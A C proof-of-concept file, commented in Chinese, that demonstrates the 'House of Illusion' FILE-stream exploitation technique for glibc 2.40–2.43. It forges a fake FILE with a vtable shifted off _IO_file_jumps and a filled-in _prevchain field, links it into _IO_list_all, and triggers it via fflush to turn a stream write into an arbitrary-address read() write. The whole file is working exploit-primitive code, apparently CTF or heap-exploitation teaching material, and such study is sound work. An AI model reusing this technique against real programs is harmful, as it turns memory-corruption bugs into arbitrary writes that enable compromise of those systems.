#define _GNU_SOURCE

/*
 * House of Illusion 的 shifted vtable 读系统调用，适用于 glibc 2.40～2.43。
 *
 * 与 2.23～2.39 文件相比，唯一重要变化是 fake FILE 必须填写 _prevchain。
 * 底层效果仍是 read(fd, target, length)，即漏洞视角的任意地址写。
 */

#include <assert.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define IO_DELETE_DONT_CLOSE 0x0040
#define IO_IS_APPENDING 0x1000
#define IO_LINKED 0x0080

struct fake_file_plus {
    FILE file;
    const void *vtable;
};

int main(void)
{
    static char input[] = "ILLUSION:FD-TO-MEMORY";
    char target[sizeof(input)] = {0};
    char lock[64] = {0};
    struct fake_file_plus fake;
    int pipe_fd[2];

    memset(&fake, 0, sizeof(fake));

    /* dlsym 只代替题目中的 libc 泄漏和符号偏移。 */
    void **io_list_all = dlsym(RTLD_DEFAULT, "_IO_list_all");
    unsigned char *file_jumps = dlsym(RTLD_DEFAULT, "_IO_file_jumps");
    assert(io_list_all != NULL && file_jumps != NULL);

    void *saved_list = *io_list_all;

    assert(pipe(pipe_fd) == 0);
    assert(write(pipe_fd[1], input, sizeof(input)) == sizeof(input));
    close(pipe_fd[1]);

    fake.file._lock = (void *)lock;
    fake.file._chain = NULL;
    fake.file._mode = 0;
    fake.file._flags = IO_LINKED | IO_DELETE_DONT_CLOSE | IO_IS_APPENDING;
    fake.file._fileno = pipe_fd[0];
    fake.file._IO_write_base = target;
    fake.file._IO_write_ptr = target + sizeof(target);

    /*
     * glibc 2.40 起 FILE+0xb8 被复用为 _prevchain。
     * fake 是链表头，因此 _prevchain 必须指向 _IO_list_all 这个头指针槽位。
     */
    *(void ***)((char *)&fake.file + 0xb8) = io_list_all;

    /* 槽位平移结果：shifted overflow -> real finish；shifted write -> real read。 */
    fake.vtable = file_jumps - 0x8;

    *io_list_all = &fake;
    fflush(NULL);

    *io_list_all = saved_list;
    close(pipe_fd[0]);

    assert(memcmp(target, input, sizeof(input)) == 0);
    printf("[+] Illusion 任意写成功\n");
    return 0;
}
